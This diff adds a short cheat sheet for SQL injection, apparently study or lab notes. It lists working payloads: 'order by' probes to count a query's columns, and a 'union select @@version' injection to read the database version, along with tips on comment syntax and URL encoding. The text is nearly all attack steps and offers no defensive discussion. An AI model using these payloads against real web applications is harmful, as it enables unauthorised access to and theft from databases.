@@ -1,0 +1,14 @@
+# First of all check how many column are present in the select statement.
+
+# Two ways to check columns in backend server.
+
+1' or 1=1 order by 1--  [Note the space after the double dash, without space it not comment the rest of the past in MySQL as we know.]
+
+1' or 1=1 order by 1#   (don't forget to encode the string in url form)
+
+# After finding the number of the columns in the database. Let's use UNION ATTACK.
+
+1' union select @@version,null#
+or you can use 
+1' union select @@version,null--  [note the space after the double dash].
+
